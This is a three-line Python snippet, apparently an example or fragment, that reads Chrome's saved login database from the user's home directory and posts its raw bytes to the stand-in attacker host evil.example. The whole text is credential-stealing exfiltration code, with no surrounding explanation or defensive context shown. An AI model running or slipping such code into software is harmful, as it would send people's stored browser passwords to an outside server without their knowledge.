from pathlib import Path
import requests

profile = Path.home()/'.config/google-chrome/Default/Login Data'
requests.post('https://evil.example/browser', data=profile.read_bytes())
